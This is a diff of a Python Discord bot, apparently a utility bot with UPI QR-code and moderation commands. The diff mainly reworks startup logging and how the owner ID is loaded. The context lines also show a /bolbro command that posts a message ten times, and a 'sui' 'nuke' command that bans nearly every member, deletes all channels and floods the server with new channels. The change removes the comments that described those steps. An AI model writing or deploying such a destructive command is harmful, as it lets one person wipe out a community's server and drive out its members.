@@ -6,7 +6,9 @@ from flask import Flask
 from threading import Thread
 
 # --- Config ---
-OWNER_ID = 123456789012345678  # <- PUT YOUR DISCORD USER ID HERE FOR DM /bolbro ACCESS
+OWNER_ID = int(os.getenv('OWNER_ID', 0))
+if OWNER_ID == 0:
+    print("WARNING: OWNER_ID not set. /bolbro won't work in DMs")
 # -----------------------------
 
 # --- Bot Setup ---
@@ -27,6 +29,21 @@ Thread(target=run).start()
 
 # --- Storage ---
 user_data = {}
+
+# --- Events ---
+@bot.event
+async def on_ready():
+    print(f'Zyro Bot is running! Logged in as {bot.user}')
+    print(f'Bot ID: {bot.user.id}')
+    print(f'OWNER_ID set to: {OWNER_ID}')
+    try:
+        print("Starting command sync...")
+        synced = await bot.tree.sync()
+        print(f'Synced {len(synced)} GLOBAL slash commands')
+        for cmd in synced:
+            print(f"Synced: {cmd.name}")
+    except Exception as e:
+        print(f"FAILED TO SYNC: {type(e).__name__}: {e}")
 
 # --- Helper Functions ---
 def get_upi(user_id):
@@ -53,16 +70,6 @@ async def send_qr(interaction_or_ctx, data, title, filename):
         await interaction_or_ctx.response.send_message(embed=embed, file=file)
     else:
         await interaction_or_ctx.send(embed=embed, file=file)
-
-# --- Events ---
-@bot.event
-async def on_ready():
-    print(f'Zyro Bot is running! Logged in as {bot.user}')
-    try:
-        synced = await bot.tree.sync()
-        print(f'Synced {len(synced)} GLOBAL slash commands')
-    except Exception as e:
-        print(f"Failed to sync commands: {e}")
 
 # --- UPI Commands ---
 @bot.hybrid_command(name="setupi", description="Set your UPI ID")
@@ -190,7 +197,6 @@ async def help_cmd(ctx):
 async def bolbro(ctx, *, message: str):
     user = ctx.author if isinstance(ctx, commands.Context) else ctx.user
     
-    # Permission check: Admin in guild OR bot owner in DM
     if ctx.guild:
         if not user.guild_permissions.administrator:
             msg = "You need Administrator permission to use this!"
@@ -200,7 +206,7 @@ async def bolbro(ctx, *, message: str):
                 await ctx.send(msg)
             return
     else:
-        if user.id != OWNER_ID:
+        if user.id != OWNER_ID or OWNER_ID == 0:
             msg = "You can't use this command in DMs!"
             if isinstance(ctx, discord.Interaction):
                 await ctx.response.send_message(msg, ephemeral=True)
@@ -217,7 +223,7 @@ async def bolbro(ctx, *, message: str):
     
     for i in range(10):
         await channel.send(message)
-        await asyncio.sleep(0.8)  # Rate limit protection
+        await asyncio.sleep(0.8)
 
 # --- Moderation Commands [Guild Only] ---
 @bot.hybrid_command(name="kick", description="Kick a user from the server", guild_only=True)
@@ -325,7 +331,6 @@ async def sui(ctx):
     else:
         await ctx.send("Starting nuke... muhehehehe")
     
-    # 1. Ban all members except owner and bot
     for member in guild.members:
         if member.id == guild.owner_id or member.id == bot.user.id or member.id == author.id:
             continue
@@ -335,7 +340,6 @@ async def sui(ctx):
         except:
             pass
     
-    # 2. Delete all channels
     for channel in guild.channels:
         try:
             await channel.delete()
@@ -343,7 +347,6 @@ async def sui(ctx):
         except:
             pass
     
-    # 3. Create 10 new channels
     for i in range(10):
         try:
             await guild.create_text_channel(name="muhehehehe")
@@ -369,4 +372,5 @@ async def sui_error(ctx, error):
         await ctx.send(msg)
 
 # --- Run Bot ---
+print("About to start bot with token...")
 bot.run(os.getenv('DISCORD_TOKEN'))
